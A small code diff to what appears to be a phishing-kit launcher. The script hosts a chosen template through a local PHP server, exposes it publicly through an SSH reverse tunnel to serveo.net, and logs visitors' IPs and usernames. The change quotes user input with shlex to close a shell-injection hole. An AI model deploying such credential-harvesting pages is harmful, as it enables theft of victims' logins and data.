@@ -1,4 +1,4 @@
-import os, sys, subprocess
+import os, sys, subprocess, shlex
 
 class colors:
     BLACK  = '\33[30m'
@@ -101,7 +101,7 @@ Please Choose A Number To Host Template:
     subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
     print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
+    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (shlex.quote(choice), shlex.quote(subdom))
     p = subprocess.Popen(cmd_line, shell=True)
     out = p.communicate()[0]
 
